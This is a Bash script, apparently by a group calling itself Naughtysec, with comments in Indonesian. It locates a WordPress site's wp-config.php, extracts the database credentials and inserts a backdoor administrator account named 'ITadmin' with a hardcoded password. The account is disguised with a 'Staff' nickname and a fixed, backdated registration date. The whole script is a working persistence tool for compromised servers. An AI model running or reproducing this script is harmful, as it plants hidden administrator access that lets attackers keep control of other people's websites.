#!/bin/bash

# CREATE BY Naughtysec (Bash Version)
# Script untuk menambahkan user administrator WordPress

# Konfigurasi
USER="ITadmin"
USER_PASSWORD="Askurm0m#"
EMAIL="askurmom007@proton.me"

# Fungsi untuk mencari wp-config.php
find_wp_config() {
    local dir="$1"
    local max_depth=5
    local found=""
    
    for ((i=0; i<=max_depth; i++)); do
        if [[ -f "$dir/wp-config.php" ]]; then
            found="$dir/wp-config.php"
            break
        fi
        dir="$dir/.."
    done
    
    echo "$found"
}

# Cari wp-config.php
WP_CONFIG=$(find_wp_config "$(pwd)")

if [[ -z "$WP_CONFIG" ]]; then
    echo "File wp-config.php tidak ditemukan."
    exit 1
fi

echo "Menemukan wp-config.php di: $WP_CONFIG"

# Ekstrak konfigurasi database dari wp-config.php
DB_NAME=$(grep "define('DB_NAME'" "$WP_CONFIG" | cut -d"'" -f4)
DB_USER=$(grep "define('DB_USER'" "$WP_CONFIG" | cut -d"'" -f4)
DB_PASSWORD=$(grep "define('DB_PASSWORD'" "$WP_CONFIG" | cut -d"'" -f4)
DB_HOST=$(grep "define('DB_HOST'" "$WP_CONFIG" | cut -d"'" -f4)
TABLE_PREFIX=$(grep "\$table_prefix" "$WP_CONFIG" | cut -d"'" -f2)

if [[ -z "$DB_NAME" ]] || [[ -z "$DB_USER" ]] || [[ -z "$DB_PASSWORD" ]]; then
    echo "Gagal mengekstrak konfigurasi database dari wp-config.php"
    exit 1
fi

echo "Database: $DB_NAME"
echo "User DB: $DB_USER"

# Cek koneksi database
if ! mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" -e "SELECT 1" "$DB_NAME" &>/dev/null; then
    echo "Gagal terhubung ke database. Periksa kredensial."
    exit 1
fi

# Buat password hash MD5 (WordPress menggunakan MD5 untuk password lama)
PASSWORD_HASH=$(echo -n "$USER_PASSWORD" | md5sum | cut -d' ' -f1)

# Insert user ke wp_users
SQL_USER="INSERT INTO ${TABLE_PREFIX}users (user_login, user_pass, user_email, user_status, user_registered, user_nicename) VALUES ('$USER', '$PASSWORD_HASH', '$EMAIL', '0', '2022-09-09 05:42:56', 'Staff')"

mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" "$DB_NAME" -e "$SQL_USER" 2>/dev/null

if [[ $? -eq 0 ]]; then
    echo "Berhasil... $USER telah dibuat dengan kata sandi: $USER_PASSWORD"
    
    # Dapatkan ID user terakhir
    USER_ID=$(mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" "$DB_NAME" -sN -e "SELECT LAST_INSERT_ID()" 2>/dev/null)
    
    # Insert ke wp_usermeta
    SQL_META1="INSERT INTO ${TABLE_PREFIX}usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $USER_ID, '${TABLE_PREFIX}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')"
    SQL_META2="INSERT INTO ${TABLE_PREFIX}usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $USER_ID, '${TABLE_PREFIX}user_level', '10')"
    
    mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" "$DB_NAME" -e "$SQL_META1" 2>/dev/null
    mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" "$DB_NAME" -e "$SQL_META2" 2>/dev/null
    
    if [[ $? -eq 0 ]]; then
        echo "User $USER berhasil di-set sebagai administrator."
    else
        echo "Error saat memasukkan data tambahan ke dalam tabel wp_usermeta."
    fi
else
    echo "Error saat memasukkan data ke dalam tabel wp_users."
fi
